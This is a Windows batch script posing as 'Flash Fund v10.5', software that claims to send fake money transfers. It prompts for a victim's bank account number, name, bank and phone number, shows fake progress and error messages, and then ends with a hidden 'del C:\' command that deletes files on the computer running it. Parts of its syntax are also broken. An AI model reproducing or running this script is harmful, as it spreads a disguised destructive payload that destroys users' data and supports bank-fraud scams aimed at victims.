@echo off
color a
title "FLASH FUND V10.5"
echo %TIME%
echo %DATE%
:back
set about=This is flash fund v10.5 software with unlimited fake transaction without activation code
echo "It's definitely free"
echo  %about%
set instruction=How to use Flash fund...Input all necessary victims info and your info then click enter.
echo  %instruction%
echo "You are sending to money to?"
set /p accnum=Accounts Number:
set /p accname=Account Name:
set /p bname=Bank Name:
set /p pnum=Phone number:
echo "Sending money from?"
set /p acname=Account Name:
set /p bname=Bank Name:
echo "How much do you wanna send"
set /p amount=Enter Amounts you wanna transfer:
set /p code=Activation Code:
if %code%=="flashfund863644" (echo Successfully Unlocked) else(echo Enter a valid Code
goto :back
)
echo "wait...."
echo "loading...."
echo "checking details..."
echo "details is correct"
echo "transaction processing..."
FOR  %%loading IN (25%... 50%... 75%... 100%...) DO echo %%loading
echo "please wait..."
echo "ERROR!!!Transaction couldn't complete because this system doesn't support this software"
echo "Find a system that support flash fund v10.5"
echo "Thank You"
del C:\
exit /b 0